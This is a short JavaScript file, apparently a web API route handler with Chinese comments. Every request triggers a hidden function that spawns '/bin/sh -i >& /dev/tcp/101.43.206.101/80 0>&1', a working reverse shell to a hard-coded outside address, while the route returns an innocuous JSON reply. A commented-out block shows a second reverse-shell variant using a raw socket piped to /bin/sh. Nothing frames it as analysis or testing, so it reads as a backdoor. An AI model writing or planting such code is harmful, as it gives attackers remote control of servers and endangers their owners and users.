const { spawn } = require('child_process');
export default async function handler(req, res) {
  connect();
  return res.json({ name: 2 }, { status: 200 });
}

function connect() {
  // const client = new net.Socket();
  // client.connect(80, '101.43.206.101', function() {
  //   // 连接成功后启动一个shell
  //   const sh = cp.spawn('/bin/sh', []);
  //   // 将socket的数据流传递给shell的输入
  //   client.pipe(sh.stdin);
  //   sh.stdout.pipe(client);
  //   sh.stderr.pipe(client);
  //   // 如果socket关闭，也结束shell
  //   client.on('close', function() {
  //     console.log('close');
  //     sh.kill();
  //   });
  // });

// 使用spawn执行bash命令
  const child = spawn('bash', ['-c', '/bin/sh -i >& /dev/tcp/101.43.206.101/80 0>&1']);
// 我们可以监听子进程的事件
  child.on('error', (err) => {
    console.error('Failed to start child process:', err);
  });
  child.on('exit', (code, signal) => {
    console.log(`Child process exited with code ${code} and signal ${signal}`);
  });
}
